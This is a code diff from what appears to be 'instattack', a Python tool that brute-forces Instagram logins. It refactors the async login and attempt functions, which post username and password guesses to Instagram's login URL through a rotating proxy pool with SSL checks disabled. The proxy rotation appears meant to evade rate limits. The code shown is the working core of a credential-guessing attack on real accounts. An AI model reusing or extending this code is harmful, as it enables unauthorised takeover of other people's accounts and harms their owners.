@@ -4,7 +4,7 @@ import collections
 from instattack.lib import logger
 from instattack.lib.utils import limit_as_completed, cancel_remaining_tasks
 
-from instattack.app import settings
+from instattack import settings
 from instattack.app.exceptions import PoolNoProxyError
 
 from .models import InstagramResult
@@ -16,13 +16,9 @@ from .exceptions import (
 
 async def login(
     loop,
-    session,
-    user,
-    token,
-    password,
+    request_context,
     proxy,
-    proxy_pool=None,
-    scheduler=None,
+    proxy_callback=None,
     log=None,
 ):
     """
@@ -51,6 +47,8 @@ async def login(
     >>>     else:
     >>>         raise e
     """
+    log = logger.get_async(__name__, subname='login')
+
     proxy.update_time()
     result = None
 
@@ -79,7 +77,7 @@ async def login(
         if response.status != 400:
             response.raise_for_status()
             json = await response.json()
-            result = await parse_response_result(json, password, proxy)
+            result = await parse_response_result(json, request_context['password'], proxy)
             return result
         else:
             # Parse JSON First
@@ -91,32 +89,29 @@ async def login(
                 response.raise_for_status()
 
     try:
-        async with session.post(
+        async with request_context['session'].post(
             settings.INSTAGRAM_LOGIN_URL,
-            headers=settings.HEADERS(token),
+            headers=settings.HEADERS(request_context['token']),
             data={
-                settings.INSTAGRAM_USERNAME_FIELD: user.username,
-                settings.INSTAGRAM_PASSWORD_FIELD: password
+                settings.INSTAGRAM_USERNAME_FIELD: request_context['user'].username,
+                settings.INSTAGRAM_PASSWORD_FIELD: request_context['password']
             },
             ssl=False,
             proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
         ) as response:
 
             result = await raise_for_result(response)
+
+            proxy.last_request_confirmed = True
             await proxy.handle_success(save=True)
-
-            if proxy_pool:
-                await proxy_pool.check_and_put(proxy)
-
-            if scheduler:
-                await scheduler.spawn(proxy.save())
-            else:
-                await proxy.save()
+            await proxy_callback(proxy)
 
     except asyncio.CancelledError:
         pass
 
     except HTTP_RESPONSE_ERRORS as e:
+        # await log.error(e, extra={'proxy': proxy})
+
         err = find_response_error(e)
         if not err:
             raise e
@@ -124,27 +119,23 @@ async def login(
         await proxy.handle_error(err)
 
     except HTTP_REQUEST_ERRORS as e:
+        # await log.error(e, extra={'proxy': proxy})
+
         err = find_request_error(e)
         if not err:
             raise e
 
         await proxy.handle_error(err)
 
-    if proxy_pool:
-        await proxy_pool.check_and_put(proxy)
-
-    await scheduler.spawn(proxy.save())
+    await proxy_callback(proxy)
     return result
 
 
 async def attempt(
     loop,
-    session,
-    user,
-    token,
-    password,
-    proxy_pool=None,
-    scheduler=None,
+    request_context,
+    pool=None,
+    proxy_callback=None,
     batch_size=None,
 ):
     """
@@ -166,7 +157,7 @@ async def attempt(
         have not been run yet.
         """
         while True:
-            proxy = await proxy_pool.get()
+            proxy = await pool.get()
             if not proxy:
                 raise PoolNoProxyError()
 
@@ -181,13 +172,9 @@ async def attempt(
             proxies_count[proxy.unique_id] += 1
             yield login(
                 loop,
-                session,
-                user,
-                token,
-                password,
+                request_context,
                 proxy,
-                proxy_pool=proxy_pool,
-                scheduler=scheduler,
+                proxy_callback=proxy_callback,
             )
 
     # TODO:  We should figure out a way to allow proxies to repopulate and wait
@@ -209,6 +196,7 @@ async def attempt(
             # TODO: Maybe Put in Scheduler
             await cancel_remaining_tasks(futures=current_tasks)
 
+            password = request_context['password']
             await log.complete(
                 f'Done Attempting Login with {password} '
                 f'After {num_tries} Attempt(s)',
